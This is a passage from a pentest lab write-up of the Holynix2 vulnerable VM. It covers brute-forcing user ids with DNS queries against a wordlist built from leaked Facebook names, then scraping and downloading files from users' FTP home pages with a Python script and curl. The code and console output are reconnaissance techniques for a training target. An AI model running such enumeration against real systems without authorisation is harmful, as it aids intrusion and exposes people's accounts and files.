<div class="section" id="could-we-brute-force-the-user-ids">
<h3>3.16.4.2. Could we brute-force the user ids?<a class="headerlink" href="#could-we-brute-force-the-user-ids" title="Permalink to this headline">¶</a></h3>
<p>Suppose our DNS axfr failed. Could a significant part of the user list be brute-forced? Let’s assume we guessed the user ids were first initial, last name and used the <a class="reference external" href="http://downloads.skullsecurity.org/passwords/facebook-f.last-withcount.txt.bz2">First initial last names - w/ count</a> file from <a class="reference external" href="https://wiki.skullsecurity.org/Passwords">Passwords</a>. How many would we have gotten after a reasonable number of DNS queries?</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span>curl --silent --remote-name http://downloads.skullsecurity.org/passwords/facebook-f.last-withcount.txt.bz2
tar -xvjf facebook-f.last-withcount.txt.bz2
<span class="nv">NAMES</span><span class="o">=</span><span class="s2">&quot;ahuxley amckinley bzimmerman cbergey cfinnerly&quot;</span>
<span class="nv">NAMES</span><span class="o">=</span><span class="s2">&quot; </span><span class="nv">$NAMES</span><span class="s2"> cjalong cmahong cmanson ddonnovan ddypsky&quot;</span>
<span class="nv">NAMES</span><span class="o">=</span><span class="s2">&quot; </span><span class="nv">$NAMES</span><span class="s2"> dhammond dmoran dsummers evorhees gwelch&quot;</span>
<span class="nv">NAMES</span><span class="o">=</span><span class="s2">&quot; </span><span class="nv">$NAMES</span><span class="s2"> hmcknight jgacy jsmith jstreet kmccallum&quot;</span>
<span class="nv">NAMES</span><span class="o">=</span><span class="s2">&quot; </span><span class="nv">$NAMES</span><span class="s2"> lnickerbacher lsanderson lwestre ncobol rcropper&quot;</span>
<span class="nv">NAMES</span><span class="o">=</span><span class="s2">&quot; </span><span class="nv">$NAMES</span><span class="s2"> rfrost rwoo skrymple splath tmartin&quot;</span>
<span class="k">for</span> n in <span class="nv">$NAMES</span><span class="p">;</span> <span class="k">do</span>
  <span class="c1"># name check output format is:</span>
  <span class="c1">#   LINE_FOUND:   NUM_NAMES NAME</span>
  <span class="nb">echo</span> checking <span class="nv">$n</span>
  grep -n -m <span class="m">1</span> <span class="s2">&quot;</span><span class="nv">$n</span><span class="s2">&quot;</span> facebook-f.last-withcount.txt
<span class="k">done</span>
</pre></div>
</div>
<p>When running the check we saw:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">checking ahuxley</span>
<span class="go">158988:     97 ahuxley</span>
<span class="go">checking amckinley</span>
<span class="go">27746:    535 amckinley</span>
<span class="go">checking bzimmerman</span>
<span class="go">10770:   1223 bzimmerman</span>
<span class="go">checking cbergey</span>
<span class="go">384763:     38 cbergey</span>
<span class="go">checking cfinnerly</span>
<span class="go">checking cjalong</span>
<span class="go">3074431:      4 cjalong</span>
<span class="go">checking cmahong</span>
<span class="go">6256367:      2 cmahong</span>
<span class="go">checking cmanson</span>
<span class="go">30574:    490 cmanson</span>
<span class="go">checking ddonnovan</span>
<span class="go">3045816:      4 ddonnovan</span>
<span class="go">checking ddypsky</span>
<span class="go">checking dhammond</span>
<span class="go">6589:   1833 dhammond</span>
<span class="go">checking dmoran</span>
<span class="go">11439:   1163 dmoran</span>
<span class="go">checking dsummers</span>
<span class="go">7808:   1602 dsummers</span>
<span class="go">checking evorhees</span>
<span class="go">3948134:      3 evorhees</span>
<span class="go">checking gwelch</span>
<span class="go">20300:    707 gwelch</span>
<span class="go">checking hmcknight</span>
<span class="go">99115:    157 hmcknight</span>
<span class="go">checking jgacy</span>
<span class="go">1174299:     11 jgacy</span>
<span class="go">checking jsmith</span>
<span class="go">1: 129369 jsmith</span>
<span class="go">checking jstreet</span>
<span class="go">12828:   1056 jstreet</span>
<span class="go">checking kmccallum</span>
<span class="go">32894:    458 kmccallum</span>
<span class="go">checking lnickerbacher</span>
<span class="go">checking lsanderson</span>
<span class="go">21333:    676 lsanderson</span>
<span class="go">checking lwestre</span>
<span class="go">2316133:      5 lwestre</span>
<span class="go">checking ncobol</span>
<span class="go">10621681:      1 ncobol</span>
<span class="go">checking rcropper</span>
<span class="go">179193:     85 rcropper</span>
<span class="go">checking rfrost</span>
<span class="go">11311:   1173 rfrost</span>
<span class="go">checking rwoo</span>
<span class="go">1410:   5722 rwood</span>
<span class="go">checking skrymple</span>
<span class="go">checking splath</span>
<span class="go">178955:     85 splath</span>
<span class="go">checking tmartin</span>
<span class="go">330:  14139 tmartin</span>
</pre></div>
</div>
<p>So out of the 30 user ids, 4 were not in the Facebook list. But to get those we would have had to check 6,256,367 names. If we only checked the top 1,000 names (15 seconds) we would have found only 2 names; 10,000 names (2.5 minutes) would yield 5; 100,000 (25 minutes, presumably) would yield 15 (half) and would pick up the userid tmartin (whose password was first hacked). If looking for some id’s to try, that would be enough to start. Here the script to time 100,000 checks:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">D</span><span class="o">=</span><span class="k">$(</span>date<span class="k">)</span>
<span class="nv">N</span><span class="o">=</span><span class="m">0</span>
<span class="nv">NCHECK</span><span class="o">=</span><span class="m">100000</span>
<span class="k">while</span> <span class="nb">read</span> LINE<span class="p">;</span> <span class="k">do</span>
  <span class="o">((</span><span class="nv">N</span><span class="o">=</span>N+1<span class="o">))</span>
  <span class="o">[[</span> <span class="nv">$N</span> -gt <span class="nv">$NCHECK</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nb">break</span>
  <span class="nv">LINE</span><span class="o">=</span><span class="si">${</span><span class="nv">LINE</span><span class="p">##* </span><span class="si">}</span>
  dig A @192.168.1.88 <span class="nv">$LINE</span>.zincftp.com &gt; /dev/null
<span class="k">done</span> &lt; facebook-f.last-withcount.txt
<span class="nb">echo</span> <span class="nv">$D</span>
date
</pre></div>
</div>
</div>
<div class="section" id="what-s-on-the-user-s-ftp-web-page">
<h3>3.16.4.3. What’s on the user’s FTP web page?<a class="headerlink" href="#what-s-on-the-user-s-ftp-web-page" title="Permalink to this headline">¶</a></h3>
<p>Finding exploitable content on the user’s home page appears to have been a dead end. But to illustrate how you’d automate that we include it in the writeup.</p>
<p>Change your DNS resolution to use $T since fetching the user’s home page requires using the FQDN. For Kali that implies changing your <code class="file docutils literal"><span class="pre">/etc/resolv.conf</span></code> to have “nameserver” point to $T.</p>
<p>Let’s pick out the links on the user home pages using <a class="reference external" href="http://www.crummy.com/software/BeautifulSoup/bs4/doc/">Beautiful Soup</a>. That requires the following python file named <code class="docutils literal"><span class="pre">getlinks.py</span></code> in the directory $PT/files and making it executable:</p>
<div class="highlight-python"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
<span class="kn">import</span> <span class="nn">argparse</span>
<span class="kn">import</span> <span class="nn">urlparse</span>
<span class="kn">import</span> <span class="nn">urllib2</span>
<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s2">&quot;Scrape page for hrefs&quot;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;url&quot;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;url to fetch hrefs&quot;</span><span class="p">)</span>
    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
    <span class="k">try</span><span class="p">:</span>
      <span class="n">req</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">url</span><span class="p">)</span>
      <span class="n">url_r</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">geturl</span><span class="p">()</span>
      <span class="n">status</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">getcode</span><span class="p">()</span>
      <span class="n">page</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
      <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">page</span><span class="p">)</span>
      <span class="n">soup</span><span class="o">.</span><span class="n">prettify</span><span class="p">()</span>
      <span class="k">for</span> <span class="n">anchor</span> <span class="ow">in</span> <span class="n">soup</span><span class="o">.</span><span class="n">findAll</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="n">href</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
          <span class="k">print</span> <span class="n">urlparse</span><span class="o">.</span><span class="n">urljoin</span><span class="p">(</span><span class="n">url_r</span><span class="p">,</span> <span class="n">anchor</span><span class="p">[</span><span class="s1">&#39;href&#39;</span><span class="p">])</span>
    <span class="k">except</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">URLError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
      <span class="k">print</span> <span class="n">e</span><span class="o">.</span><span class="n">reason</span>
    <span class="k">except</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">HTTPError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
      <span class="k">print</span> <span class="n">e</span><span class="o">.</span><span class="n">reason</span>
</pre></div>
</div>
<p>Using the python program, download the files for inspection:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$PT</span>/files
mkdir -p downloads
sed <span class="s1">&#39;s/^/http:\/\//;s/$/.zincftp.com\//&#39;</span> <span class="nv">$PT</span>/passwords/users.txt &gt; urls.txt
cat urls.txt <span class="p">|</span> xargs -n <span class="m">1</span> ./getlinks.py <span class="p">|</span> <span class="se">\</span>
  egrep -v <span class="s1">&#39;\?C=N;O=D|\?C=M;O=A|\?C=S;O=A|\?C=D;O=A&#39;</span> <span class="se">\</span>
  &gt; home_links.txt
cat home_links.txt
<span class="nb">cd</span> downloads
cat ../home_links.txt <span class="p">|</span> xargs -n <span class="m">1</span> curl --silent --remote-name
<span class="nb">cd</span> ..
ls -la downloads/
file -k downloads/*
</pre></div>
</div>
<p>Running this gives us:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/passwords$ cd $</span>PT/files
<span class="gp">hacker@kali:~/pentest/holynix2/files$</span> mkdir -p downloads
<span class="gp">hacker@kali:~/pentest/holynix2/files$</span> sed <span class="s1">&#39;s/^/http:\/\//;s/$/.zincftp.com\//&#39;</span> <span class="nv">$PT</span>/users/users.txt &gt; urls.txt
<span class="gp">hacker@kali:~/pentest/holynix2/files$</span> cat urls.txt <span class="p">|</span> xargs -n <span class="m">1</span> ./getlinks.py <span class="p">|</span> <span class="se">\</span>
&gt;   egrep -v <span class="s1">&#39;\?C=N;O=D|\?C=M;O=A|\?C=S;O=A|\?C=D;O=A&#39;</span> <span class="se">\</span>
&gt;   &gt; home_links.txt
<span class="gp">hacker@kali:~/pentest/holynix2/files$</span> cat home_links.txt
<span class="hll"><span class="go">http://cjalong.zincftp.com/103670-pink_floyd_617_409.jpg</span>
</span><span class="hll"><span class="go">http://cjalong.zincftp.com/pinkdance.jpg</span>
</span><span class="hll"><span class="go">http://ddonnovan.zincftp.com/resume.txt</span>
</span><span class="hll"><span class="gp">http://dmoran.zincftp.com/New%</span>20Image1.jpg
</span><span class="hll"><span class="go">http://dmoran.zincftp.com/girlscouts.jpg</span>
</span><span class="hll"><span class="go">http://dmoran.zincftp.com/mac-users.jpg</span>
</span><span class="hll"><span class="go">http://dmoran.zincftp.com/prime.jpg</span>
</span><span class="hll"><span class="go">http://dmoran.zincftp.com/simplicity.jpg</span>
</span><span class="hll"><span class="go">http://hmcknight.zincftp.com/family-photo-2005-10.jpg</span>
</span><span class="hll"><span class="go">http://jstreet.zincftp.com/manson.mp3</span>
</span><span class="hll"><span class="go">http://jstreet.zincftp.com/wrar393.exe</span>
</span><span class="hll"><span class="go">http://lwestre.zincftp.com/lighttpd-1.4.17.tar.gz</span>
</span><span class="hll"><span class="go">http://lwestre.zincftp.com/peercast.1212.tgz</span>
</span><span class="hll"><span class="go">http://lwestre.zincftp.com/wu-ftpd-2.6.0.tar.gz</span>
</span><span class="hll"><span class="gp">http://ncobol.zincftp.com/Hitler%</span>20sings.wmv
</span><span class="hll"><span class="go">http://rcropper.zincftp.com/3some.jpg</span>
</span><span class="hll"><span class="go">http://rcropper.zincftp.com/invisibleman.jpg</span>
</span><span class="hll"><span class="gp">http://rcropper.zincftp.com/mans%20dream%</span>20remote.jpg
</span><span class="hll"><span class="go">http://rcropper.zincftp.com/phase10_win32_0.1.zip</span>
</span><span class="hll"><span class="gp">http://rfrost.zincftp.com/Shopping%</span>20List.txt
</span><span class="gp">hacker@kali:~/pentest/holynix2/files$</span> <span class="nb">cd</span> downloads
<span class="gp">hacker@kali:~/pentest/holynix2/files/downloads$</span> cat ../home_links.txt <span class="p">|</span> xargs -n <span class="m">1</span> curl --silent --remote-name
<span class="gp">hacker@kali:~/pentest/holynix2/files/downloads$</span> <span class="nb">cd</span> ..
<span class="gp">hacker@kali:~/pentest/holynix2/files$</span> ls -la downloads/
<span class="go">total 13368</span>
<span class="go">drwxr-xr-x 2 hacker hacker    4096 Jun  7 10:23 .</span>
<span class="go">drwxr-xr-x 4 hacker hacker    4096 Jun  7 10:21 ..</span>
<span class="go">-rw-r--r-- 1 hacker hacker   73728 Jun  7 10:23 103670-pink_floyd_617_409.jpg</span>
<span class="go">-rw-r--r-- 1 hacker hacker   33178 Jun  7 10:23 3some.jpg</span>
<span class="go">-rw-r--r-- 1 hacker hacker  664848 Jun  7 10:23 family-photo-2005-10.jpg</span>
<span class="go">-rw-r--r-- 1 hacker hacker   57036 Jun  7 10:23 girlscouts.jpg</span>
<span class="go">-rw-r--r-- 1 hacker hacker 4071333 Jun  7 10:23 Hitler%20sings.wmv</span>
<span class="go">-rw-r--r-- 1 hacker hacker    7967 Jun  7 10:23 invisibleman.jpg</span>
<span class="go">-rw-r--r-- 1 hacker hacker  801282 Jun  7 10:23 lighttpd-1.4.17.tar.gz</span>
<span class="go">-rw-r--r-- 1 hacker hacker   72859 Jun  7 10:23 mac-users.jpg</span>
<span class="go">-rw-r--r-- 1 hacker hacker   19248 Jun  7 10:23 mans%20dream%20remote.jpg</span>
<span class="go">-rw-r--r-- 1 hacker hacker 4840032 Jun  7 10:23 manson.mp3</span>
<span class="go">-rw-r--r-- 1 hacker hacker   94589 Jun  7 10:23 New%20Image1.jpg</span>
<span class="go">-rw-r--r-- 1 hacker hacker  197079 Jun  7 10:23 peercast.1212.tgz</span>
<span class="go">-rw-r--r-- 1 hacker hacker  837160 Jun  7 10:23 phase10_win32_0.1.zip</span>
<span class="go">-rw-r--r-- 1 hacker hacker   32484 Jun  7 10:23 pinkdance.jpg</span>
<span class="go">-rw-r--r-- 1 hacker hacker   95037 Jun  7 10:23 prime.jpg</span>
<span class="go">-rw-r--r-- 1 hacker hacker    1256 Jun  7 10:23 resume.txt</span>
<span class="go">-rw-r--r-- 1 hacker hacker     108 Jun  7 10:23 Shopping%20List.txt</span>
<span class="go">-rw-r--r-- 1 hacker hacker   40724 Jun  7 10:23 simplicity.jpg</span>
<span class="go">-rw-r--r-- 1 hacker hacker 1364522 Jun  7 10:23 wrar393.exe</span>
<span class="go">-rw-r--r-- 1 hacker hacker  339122 Jun  7 10:23 wu-ftpd-2.6.0.tar.gz</span>
<span class="gp">hacker@kali:~/pentest/holynix2/files$</span> file -k downloads/*
<span class="go">downloads/103670-pink_floyd_617_409.jpg: JPEG image data, JFIF standard 1.02</span>
<span class="go">downloads/3some.jpg:                     JPEG image data, JFIF standard 1.01, comment: &quot;CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 85&quot;</span>
<span class="go">downloads/family-photo-2005-10.jpg:      JPEG image data, EXIF standard</span>
<span class="go">downloads/girlscouts.jpg:                JPEG image data, JFIF standard 1.00, comment: &quot;LEAD Technologies Inc. V1.01&quot;</span>
<span class="go">downloads/Hitler%20sings.wmv:            Microsoft ASF</span>
<span class="go">downloads/invisibleman.jpg:              JPEG image data, JFIF standard 1.01</span>
<span class="go">downloads/lighttpd-1.4.17.tar.gz:        gzip compressed data, from Unix, last modified: Tue Aug 28 17:41:33 2007, max compression</span>
<span class="go">downloads/mac-users.jpg:                 JPEG image data, JFIF standard 1.02</span>
<span class="go">downloads/mans%20dream%20remote.jpg:     JPEG image data, JFIF standard 1.01, comment: &quot;Software: Microsoft Office&quot;</span>
<span class="go">downloads/manson.mp3:                    Audio file with ID3 version 2.3.0, contains: MPEG ADTS, layer III, v1, 320 kbps, 44.1 kHz, JntStereo</span>
<span class="go">downloads/New%20Image1.jpg:              JPEG image data, JFIF standard 1.01, comment: &quot;CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 95&quot;</span>
<span class="go">downloads/peercast.1212.tgz:             gzip compressed data, from Unix, last modified: Fri May 27 01:49:44 2005</span>
<span class="go">downloads/phase10_win32_0.1.zip:         Zip archive data, at least v2.0 to extract</span>
<span class="go">downloads/pinkdance.jpg:                 JPEG image data, JFIF standard 1.02</span>
<span class="go">downloads/prime.jpg:                     JPEG image data, JFIF standard 1.01, comment: &quot;CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 90&quot;</span>
<span class="go">downloads/resume.txt:                    ASCII text</span>
<span class="go">downloads/Shopping%20List.txt:           ASCII text</span>
<span class="go">downloads/simplicity.jpg:                JPEG image data, JFIF standard 1.01</span>
<span class="go">downloads/wrar393.exe:                   PE32 executable (GUI) Intel 80386, for MS Windows, RAR self-extracting archive</span>
<span class="go">downloads/wu-ftpd-2.6.0.tar.gz:          gzip compressed data, from Unix, last modified: Sat Oct 16 17:54:51 1999</span>
</pre></div>
</div>
<p>Once you’ve downloaded all the files you can switch DNS name resolution back. A quick peek at the downloaded files didn’t show any obvious exploit material.</p>
<p>After inspecting the downloaded files nothing of immediate consequence stands out. The <code class="file docutils literal"><span class="pre">resume.txt</span></code> flagged user ddonnovan as a potential administrative user along with lwestre for the “.gz” files and rcropper for <code class="file docutils literal"><span class="pre">phase10_win32_0.1.zip</span></code>.</p>
</div>
</div>
</div>


           </div>
           <div class="articleComments">
            
           </div>
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="holynix1.html" class="btn btn-neutral float-right" title="3.17. Holynix1" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
      
      
        <a href="security_shepherd_xss.html" class="btn btn-neutral" title="3.15.9. XSS" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <p>
        &copy; Copyright 2017, bitbender.

    </p>
  </div>
  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>

        </div>
      </div>

    </section>

  </div>
  


  

    <script type="text/javascript">
        var DOCUMENTATION_OPTIONS = {
            URL_ROOT:'../',
            VERSION:'1.0.3',
            COLLAPSE_INDEX:false,
            FILE_SUFFIX:'.html',
            HAS_SOURCE:  true,
            SOURCELINK_SUFFIX: '.txt'
        };
    </script>
      <script type="text/javascript" src="../_static/jquery.js"></script>
      <script type="text/javascript" src="../_static/underscore.js"></script>
      <script type="text/javascript" src="../_static/doctools.js"></script>
      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

  

  
  
    <script type="text/javascript" src="../_static/js/theme.js"></script>
  

  
  
  <script type="text/javascript">
      jQuery(function () {
          SphinxRtdTheme.StickyNav.enable();
      });
  </script>
   

</body>
</html>